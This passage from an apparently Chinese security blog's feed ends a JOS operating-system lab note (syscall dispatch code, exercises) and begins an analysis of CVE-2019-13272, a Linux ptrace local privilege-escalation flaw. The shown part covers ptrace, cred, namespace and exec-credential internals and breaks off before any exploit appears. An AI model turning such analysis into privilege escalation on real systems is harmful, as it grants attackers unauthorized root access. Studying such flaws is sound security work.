class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Dispatches to the correct kernel function, passing the arguments.</span><br><span class="hljs-type">int32_t</span><br><span class="hljs-title function_">syscall</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> syscallno, <span class="hljs-type">uint32_t</span> a1, <span class="hljs-type">uint32_t</span> a2, <span class="hljs-type">uint32_t</span> a3, <span class="hljs-type">uint32_t</span> a4, <span class="hljs-type">uint32_t</span> a5)</span><br>&#123;<br><span class="hljs-comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span><br><span class="hljs-comment">// Return any appropriate return value.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// panic(&quot;syscall not implemented&quot;);</span><br><br><span class="hljs-keyword">switch</span> (syscallno) &#123;<br><span class="hljs-keyword">case</span> SYS_cputs:<br>sys_cputs((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)a1, a2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> SYS_cgetc:<br><span class="hljs-keyword">return</span> sys_cgetc();<br><span class="hljs-keyword">case</span> SYS_getenvid:<br><span class="hljs-keyword">return</span> sys_getenvid();<br><span class="hljs-keyword">case</span> SYS_env_destroy:<br><span class="hljs-keyword">return</span> sys_env_destroy(a1);<br><span class="hljs-keyword">case</span> SYS_yield:<br>sys_yield();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后是习题 Time：</p><blockquote><p><strong>Question</strong></p><ol><li>In your implementation of <code>env_run()</code> you should have called <code>lcr3()</code>. Before and after the call to <code>lcr3()</code>, your code makes references (at least it should) to the variable <code>e</code>, the argument to <code>env_run</code>. Upon loading the <code>%cr3</code> register, the addressing context used by the MMU is instantly changed. But a virtual address (namely <code>e</code>) has meaning relative to a given address context–the address context specifies the physical address to which the virtual address maps. Why can the pointer <code>e</code> be dereferenced both before and after the addressing switch?</li><li>Whenever the kernel switches from one environment to another, it must ensure the old environment’s registers are saved so they can be restored properly later. Why? Where does this happen?</li></ol></blockquote><p>两个 Challenge，</p><blockquote><p><em>Challenge!</em> Add a less trivial scheduling policy to the kernel, such as a fixed-priority scheduler that allows each environment to be assigned a priority and ensures that higher-priority environments are always chosen in preference to lower-priority environments. If you’re feeling really adventurous, try implementing a Unix-style adjustable-priority scheduler or even a lottery or stride scheduler. (Look up “lottery scheduling” and “stride scheduling” in Google.)</p><p>Write a test program or two that verifies that your scheduling algorithm is working correctly (i.e., the right environments get run in the right order). It may be easier to write these test programs once you have implemented <code>fork()</code> and IPC in parts B and C of this lab.</p></blockquote><blockquote><p><em>Challenge!</em> The JOS kernel currently does not allow applications to use the x86 processor’s x87 floating-point unit (FPU), MMX instructions, or Streaming SIMD Extensions (SSE). Extend the <code>Env</code> structure to provide a save area for the processor’s floating point state, and extend the context switching code to save and restore this state properly when switching from one environment to another. The <code>FXSAVE</code> and <code>FXRSTOR</code> instructions may be useful, but note that these are not in the old i386 user’s manual because they were introduced in more recent processors. Write a user-level test program that does something cool with floating-point.</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;不如 Windows XP 好用&lt;/p&gt;</summary>
    
    
    
    <category term="EXPERIMENTS" scheme="http://blog.arttnba3.cn/categories/EXPERIMENTS/"/>
    
    
    <category term="实验笔记" scheme="http://blog.arttnba3.cn/tags/%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MIT" scheme="http://blog.arttnba3.cn/tags/MIT/"/>
    
    <category term="操作系统" scheme="http://blog.arttnba3.cn/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="XV6" scheme="http://blog.arttnba3.cn/tags/XV6/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x05】CVE-2019-13272 ptrace 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/"/>
    <id>http://blog.arttnba3.cn/2022/01/17/CVE-0X05-CVE-2019-13272/</id>
    <published>2022-01-16T17:49:56.000Z</published>
    <updated>2022-01-16T17:54:33.000Z</updated>
    
    <content type="html"><![CDATA[<p>你不许说他，他是你爹？</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>CVE-2019-13272 是自 Linux v4.11 版本起引入的一个本地提权漏洞，由来自 Google Zero Project 安全团队的  Jann Horn （<s>很帅气的外国小哥</s>）于 2019 年 9 月发现，该漏洞的成因主要是 ptrace 系统调用中 <code>PTRACE_TRACEME</code> 参数调用路径上的 <code>ptrace_link()</code> 函数错误地处理了想要创建 ptrace 关系的进程间的凭据记录，从而导致攻击者可以通过 suid 程序实现本地提权</p><p>该漏洞影响版本从 <code>v4.11</code> 到 <code>v5.1.17</code>，不过<strong>只能在有着桌面环境的情况下完成提权</strong>，因为提权需要用到一个通常只在桌面环境下存在的 <em>helper程序</em> ，所以相对比较鸡肋</p><p>在分析该漏洞之前，我们先补充一些前置知识</p><blockquote><p>以下内核源码皆来自于 Linux v4.11</p></blockquote><h2 id="ptrace-系统调用">ptrace 系统调用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">ptrace</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> __ptrace_request request, <span class="hljs-type">pid_t</span> pid,</span><br><span class="hljs-params">                   <span class="hljs-type">void</span> *addr, <span class="hljs-type">void</span> *data)</span>;<br></code></pre></td></tr></table></figure><p>ptrace 系统调用主要用于对进程进行调试：该系统调用提供了一种机制使得调试进程（ptracer）可以观察与控制被调试进程（ptracee）的执行过程，并修改被调试进程的寄存器及内存，从而操控被调试进程实现特定的行为</p><blockquote><p>相信大家对这个系统调用应该都不陌生，gdb 调试便是利用了这个系统调用</p></blockquote><p>常见的建立 ptrace 连接有两种方法：</p><ul><li>子进程通过 <code>PTRACE_TRACEME</code> 请求父进程进行调试</li><li>父进程通过 <code>PTRACE_ATTACH</code> 主动对指定进程进行调试</li></ul><p>这个漏洞主要是出现在第一条路径中，因此我们下文主要针对第一条路径进行分析</p><p>一个典型的通过 ptrace 由父进程对子进程进行单步调试的例子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> wait_val;<br>    <span class="hljs-type">int</span> instructions = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> child_pid = fork();<br>    <span class="hljs-keyword">if</span> (!child_pid) <span class="hljs-comment">// child</span><br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Set the child as a ptracee.&quot;</span>);<br>        ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// let the parent ptrace it, won&#x27;t stop there but send a signal to parent</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done. Now waiting for the parent...&quot;</span>);<br>        execl(<span class="hljs-string">&quot;./helloworld&quot;</span>, <span class="hljs-string">&quot;helloworld&quot;</span>, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// the programme to be debug</span><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">// parent</span><br>    &#123;<br>        wait(&amp;wait_val); <span class="hljs-comment">// waiting for the signal from child</span><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Parent received signal, running...&quot;</span>);<br>        <span class="hljs-keyword">while</span> (wait_val == <span class="hljs-number">1407</span>) <br>        &#123;<br>            instructions++;<br>            <span class="hljs-keyword">if</span> (ptrace(PTRACE_SINGLESTEP, child_pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) != <span class="hljs-number">0</span>)<br>                perror(<span class="hljs-string">&quot;ptrace error!&quot;</span>);<br>            <br>            wait(&amp;wait_val);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Done for %d instructions.\n&quot;</span>, instructions);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Parent quit.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://s2.loli.net/2022/01/13/ZodQuBfgsrLCXlp.png" alt="image.png"></p><p>通常情况下，ptrace <strong>只能调试属于 ptracer 所属用户的进程</strong>，例如普通用户便不能调试 root 进程</p><h2 id="task-struct：进程描述符（process-descriptor）">task_struct：进程描述符（process descriptor）</h2><p>在 Linux 中一个进程便是一个 task，在 kernel 中使用一个 <code>task_struct</code> 结构体进行标识，该结构体定义于内核源码<code>include/linux/sched.h</code>中</p><p>我们主要关心其对于进程权限的管理，注意到<code>task_struct</code>的源码中有如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Process credentials: */</span><br><br><span class="hljs-comment">/* Tracer&#x27;s credentials at attach: */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">ptracer_cred</span>;</span><br><br><span class="hljs-comment">/* Objective and real subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">real_cred</span>;</span><br><br><span class="hljs-comment">/* Effective (overridable) subjective task credentials (COW): */</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> __<span class="hljs-title">rcu</span>*<span class="hljs-title">cred</span>;</span><br></code></pre></td></tr></table></figure><p><strong>Process credentials</strong> 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p><ul><li>**ptracer_cred：**使用<code>ptrace</code>系统调用跟踪该进程的调试进程（ptracer）的 cred</li><li><strong>real_cred：<strong>即</strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li><li><strong>cred：<strong>即</strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li></ul><h2 id="cred：进程权限凭证（credentials）">cred：进程权限凭证（credentials）</h2><p>对于一个进程，在内核当中使用一个结构体<code>cred</code>管理其权限，该结构体定义于内核源码<code>include/linux/cred.h</code>中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br><span class="hljs-type">atomic_t</span>usage;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br><span class="hljs-type">atomic_t</span>subscribers;<span class="hljs-comment">/* number of processes subscribed */</span><br><span class="hljs-type">void</span>*put_addr;<br><span class="hljs-type">unsigned</span>magic;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC0x43736564</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">kuid_t</span>uid;<span class="hljs-comment">/* real UID of the task */</span><br><span class="hljs-type">kgid_t</span>gid;<span class="hljs-comment">/* real GID of the task */</span><br><span class="hljs-type">kuid_t</span>suid;<span class="hljs-comment">/* saved UID of the task */</span><br><span class="hljs-type">kgid_t</span>sgid;<span class="hljs-comment">/* saved GID of the task */</span><br><span class="hljs-type">kuid_t</span>euid;<span class="hljs-comment">/* effective UID of the task */</span><br><span class="hljs-type">kgid_t</span>egid;<span class="hljs-comment">/* effective GID of the task */</span><br><span class="hljs-type">kuid_t</span>fsuid;<span class="hljs-comment">/* UID for VFS ops */</span><br><span class="hljs-type">kgid_t</span>fsgid;<span class="hljs-comment">/* GID for VFS ops */</span><br><span class="hljs-type">unsigned</span>securebits;<span class="hljs-comment">/* SUID-less security management */</span><br><span class="hljs-type">kernel_cap_t</span>cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br><span class="hljs-type">kernel_cap_t</span>cap_permitted;<span class="hljs-comment">/* caps we&#x27;re permitted */</span><br><span class="hljs-type">kernel_cap_t</span>cap_effective;<span class="hljs-comment">/* caps we can actually use */</span><br><span class="hljs-type">kernel_cap_t</span>cap_bset;<span class="hljs-comment">/* capability bounding set */</span><br><span class="hljs-type">kernel_cap_t</span>cap_ambient;<span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>jit_keyring;<span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment"> * keys to */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">session_keyring</span>;</span> <span class="hljs-comment">/* keyring inherited over fork */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">process_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this process */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">thread_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this thread */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">request_key_auth</span>;</span> <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SECURITY</span><br><span class="hljs-type">void</span>*security;<span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span><span class="hljs-comment">/* real user ID subscription */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">user_ns</span>;</span> <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group_info</span> *<span class="hljs-title">group_info</span>;</span><span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br><span class="hljs-comment">/* RCU deletion */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">int</span> non_rcu;<span class="hljs-comment">/* Can we skip RCU deletion? */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span><span class="hljs-title">rcu</span>;</span><span class="hljs-comment">/* RCU deletion hook */</span><br>&#125;;<br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><p>我们主要关注<code>cred</code>结构体中管理权限的变量</p><h3 id="用户ID-组ID">用户ID &amp; 组ID</h3><p>一个cred结构体中记载了<strong>一个进程四种不同的用户ID</strong>：</p><ul><li><strong>真实用户ID</strong>（real UID）：标识一个进程<strong>启动时的用户ID</strong></li><li><strong>保存用户ID</strong>（saved UID）：标识一个进程<strong>最初的有效用户ID</strong></li><li><strong>有效用户ID</strong>（effective UID）：标识一个进程<strong>正在运行时所属的用户ID</strong>，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限</li><li><strong>文件系统用户ID</strong>（UID for VFS ops）：标识一个进程<strong>创建文件时进行标识的用户ID</strong></li></ul><p>在通常情况下这几个ID应当都是相同的</p><p>用户组ID同样分为四个：<code>真实组ID</code>、<code>保存组ID</code>、<code>有效组ID</code>、<code>文件系统组ID</code>，与用户ID是类似的，这里便不再赘叙</p><h3 id="命名空间（namespace）">命名空间（namespace）</h3><p>cred 结构体中的 user_ns  字段标识了该进程所属的命名空间</p><h2 id="namespace：命名空间">namespace：命名空间</h2><p><strong>命名空间</strong>（<strong>namespace</strong>） <strong>是 Linux kernel 用来隔离内核资源的方式。</strong> 通过 namespace 可以让一些进程只能看到与自己相关的一部分资源，而另外一些进程也只能看到与它们自己相关的资源，双方都无法访问对方命名空间中的资源</p><p>在 cred 当中有指向其所属命名空间的指针，在Linux kernel 中命名空间为一个 <code>user_namespace</code> 结构体，该结构体定义于 <code>/include/linux/user_namespace.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uid_gid_map</span><span class="hljs-title">uid_map</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uid_gid_map</span><span class="hljs-title">gid_map</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uid_gid_map</span><span class="hljs-title">projid_map</span>;</span><br><span class="hljs-type">atomic_t</span>count;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>*<span class="hljs-title">parent</span>;</span><br><span class="hljs-type">int</span>level;<br><span class="hljs-type">kuid_t</span>owner;<br><span class="hljs-type">kgid_t</span>group;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ns_common</span><span class="hljs-title">ns</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>flags;<br><br><span class="hljs-comment">/* Register of per-UID persistent keyrings for this namespace */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PERSISTENT_KEYRINGS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>*<span class="hljs-title">persistent_keyring_register</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span><span class="hljs-title">persistent_keyring_register_sem</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span><span class="hljs-title">work</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSCTL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ctl_table_set</span><span class="hljs-title">set</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ctl_table_header</span> *<span class="hljs-title">sysctls</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ucounts</span>*<span class="hljs-title">ucounts</span>;</span><br><span class="hljs-type">int</span> ucount_max[UCOUNT_COUNTS];<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们主要关注这几个字段：</p><ul><li><strong>owner</strong>：即该命名空间的<strong>所有者</strong>；通常来说每个进程有其独立的命名空间，但对于一些需要共享资源的进程而言他们有可能会需要共享同一个命名空间</li><li><strong>group</strong>：命名空间所属的用户组</li><li><strong>parent</strong>：该命名空间的父命名空间，关系类似于父子进程，最上一层为 init_cred 的命名空间 <code>init_user_ns</code></li></ul><h2 id="linux-binprm：待执行文件数据">linux_binprm：待执行文件数据</h2><p>前面讲到 ptrace 应当配合着 execve 进行使用，在 execve 系统调用中涉及到一个结构体叫做 <code>linux_binprm</code>，该结构体用以记录 kernel 加载（其实就是执行）一个二进制文件时用到的数据，定义于 <code>/include/linux/binfmts.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This structure is used to hold the arguments that are used when loading binaries.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_binprm</span> &#123;</span><br><span class="hljs-type">char</span> buf[BINPRM_BUF_SIZE];<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MMU</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vma_pages;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_ARG_PAGES32</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>[<span class="hljs-title">MAX_ARG_PAGES</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> p; <span class="hljs-comment">/* current top of mem */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br>cred_prepared:<span class="hljs-number">1</span>,<span class="hljs-comment">/* true if creds already prepared (multiple</span><br><span class="hljs-comment"> * preps happen for interpreters) */</span><br>cap_effective:<span class="hljs-number">1</span>;<span class="hljs-comment">/* true if has elevated effective capabilities,</span><br><span class="hljs-comment"> * false if not; except for init which inherits</span><br><span class="hljs-comment"> * its parent&#x27;s caps anyway */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __alpha__</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> taso:<span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> recursion_depth; <span class="hljs-comment">/* only for search_binary_handler() */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> * <span class="hljs-title">file</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span>;</span><span class="hljs-comment">/* new credentials */</span><br><span class="hljs-type">int</span> unsafe;<span class="hljs-comment">/* how unsafe this exec is (mask of LSM_UNSAFE_*) */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> per_clear;<span class="hljs-comment">/* bits to clear in current-&gt;personality */</span><br><span class="hljs-type">int</span> argc, envc;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span> * filename;<span class="hljs-comment">/* Name of binary as seen by procps */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> * interp;<span class="hljs-comment">/* Name of the binary really executed. Most</span><br><span class="hljs-comment">   of the time same as filename, but could be</span><br><span class="hljs-comment">   different for binfmt_&#123;misc,script&#125; */</span><br><span class="hljs-type">unsigned</span> interp_flags;<br><span class="hljs-type">unsigned</span> interp_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> loader, exec;<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里我们主要关注 cred 字段，其标识了要运行的<strong>新程序的权限</strong></p><h2 id="LSM-与-程序执行权限检查">LSM 与 程序执行权限检查</h2><p>在 task_struct 结构体当中我们注意到 <code>ptracer_cred</code> 这个字段，这个字段自 <code>Linux kernel 4.10</code>  引入到 task_struct 结构体当中，引入 ptracer_cred 的目的是用于当 tracee 执行 exec 去加载 <a href="https://www.computerhope.com/jargon/s/setuid.htm">setuid executable</a> 时做安全检测</p><blockquote><p>参见 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=64b875f7ac8a5d60a4e191479299e931ee949b67">ptrace: Capture the ptracer’s creds not PT_PTRACE_CAP</a></p></blockquote><p>这一部分会展开分析一定数量的内核源码，针对这个漏洞而言，可以直接看结论：<strong>若 ptracee 进程执行 suid/sgid 程序，则检查 ptracee 保存的 ptracer 的 cred，即 ptracee 的 task_struct 的 ptracer_cred 字段的权限，若权限不足则 ptracee 以其自身的 euid/egid 执行程序，而非文件的 suid/sgid</strong></p><h3 id="suid-sgid-文件的执行流程">suid/sgid 文件的执行流程</h3><p>当一个进程执行一个 suid 文件时（例如 <code>/usr/bin/passwd</code>），存在如下调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">SYS_execve()<br>    do_execve()<br>    do_execveat_common()<br>    prepare_binprm()<br>    bprm_fill_uid()<br></code></pre></td></tr></table></figure><p>函数 <code>bprm_fill_uid()</code> 定义于 <code>/fs/exec.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 